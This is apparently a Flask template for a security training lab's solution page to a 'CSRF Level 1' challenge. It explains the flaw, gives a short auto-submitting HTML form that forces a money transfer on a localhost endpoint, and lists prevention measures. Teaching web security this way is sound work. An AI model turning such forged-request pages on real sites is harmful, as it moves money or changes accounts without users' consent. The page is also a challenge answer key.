{% extends 'base.html' %}

{% block title %}Solution: CSRF Level 1{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-8 offset-md-2">
        <div class="card">
            <div class="card-header">
                <h2 class="text-center"><i class="bi bi-check-circle-fill text-success me-2"></i>Solution: Level 1 - Basic Form CSRF</h2>
            </div>
            <div class="card-body solution-content">
                <h3>Vulnerability Explanation</h3>
                <p>
                    This page contains a basic CSRF (Cross-Site Request Forgery) vulnerability. The money transfer form
                    accepts POST requests without any protection mechanism to verify that the request originated from
                    the legitimate application.
                </p>
                <p>
                    The vulnerability exists because the form lacks:
                </p>
                <ul>
                    <li>CSRF tokens to validate request origin</li>
                    <li>Referrer header validation</li>
                    <li>SameSite cookie attributes</li>
                    <li>Additional authentication for sensitive operations</li>
                </ul>
                
                <h3>Solution</h3>
                <p>To solve this challenge, you need to create a malicious HTML page that automatically submits a form to the vulnerable endpoint:</p>
                <div class="alert alert-secondary">
                    <code>&lt;!-- Save as malicious.html and open in browser --&gt;</code>
                </div>
                <pre><code>&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
    &lt;form action="http://localhost:5000/csrf/level1" method="POST"&gt;
        &lt;input type="hidden" name="recipient" value="999999999"&gt;
        &lt;input type="hidden" name="amount" value="5000"&gt;
        &lt;input type="hidden" name="memo" value="CSRF Attack - Level 1 Completed!"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                <p>
                    When you open this HTML file in your browser while logged into the application, it will automatically
                    submit the form and trigger the CSRF vulnerability, revealing the flag.
                </p>
                
                <h3>Real-world Impact</h3>
                <p>
                    In a real-world scenario, this type of vulnerability could be used to:
                </p>
                <ul>
                    <li>Transfer money without user consent</li>
                    <li>Change user account settings or passwords</li>
                    <li>Post content on behalf of the user</li>
                    <li>Delete user data or accounts</li>
                    <li>Perform administrative actions if targeting admin users</li>
                </ul>
                
                <h3>Prevention</h3>
                <p>To prevent this type of vulnerability, developers should:</p>
                <ul>
                    <li>Implement CSRF tokens in all state-changing forms</li>
                    <li>Validate the Referer and Origin headers</li>
                    <li>Use SameSite cookie attributes (SameSite=Strict or SameSite=Lax)</li>
                    <li>Require additional authentication for sensitive operations</li>
                    <li>Implement proper session management and timeout mechanisms</li>
                    <li>Use double-submit cookie patterns for additional protection</li>
                </ul>
                
                <div class="mt-4">
                    <a href="{{ url_for('csrf_level1') }}" class="btn btn-outline-primary">Back to Challenge</a>
                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}